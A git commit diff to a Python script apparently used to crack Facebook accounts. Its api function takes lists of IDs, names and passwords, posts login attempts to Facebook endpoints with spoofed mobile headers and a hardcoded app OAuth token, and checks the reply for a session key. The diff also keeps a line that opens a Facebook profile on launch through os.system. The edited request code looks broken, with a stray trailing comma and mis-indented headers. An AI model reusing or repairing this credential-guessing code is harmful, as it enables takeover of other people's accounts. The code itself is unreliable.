9839cd04db3ddfea94a0f00aa633008101b745b0
shezy47 <114426933+shezy47@users.noreply.github.com>
2023-06-22 10:33:41 +0500

    Add files via upload

--- umar.py
+++ umar.py
@@ -1,7 +1,7 @@
 
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open https://www.facebook.com/profile.php?id=100077405921067')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100093707197597')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 
 try:
@@ -78,7 +78,7 @@ logo = ("""
    \x1b[1;92m╔\033[1;91mKST\033[1;92m═══════════════════════\033[1;91mKST\033[1;92m╗
    \x1b[1;92m║➣TOOL NAME : SHEZY      ║
    \x1b[1;92m║➣AUTHOR    : XD         ║
-   \x1b[1;92m║➣TOOLS     : 0.1     ║
+   \x1b[1;92m║➣TOOLS     : NEW UPDATE     ║
    \x1b[1;92m║➣FACEBOOK  : Shezy Malik         ║
    \x1b[1;92m║➣Group     : SAJJAD & NADIR🥀❤️║
    \x1b[1;92m║➣Stetus    : FREE            ║
@@ -553,18 +553,24 @@ def api(ids,names,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':USMAN_ua,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-api.facebook.com/method/auth.login'
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
+                                url = 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
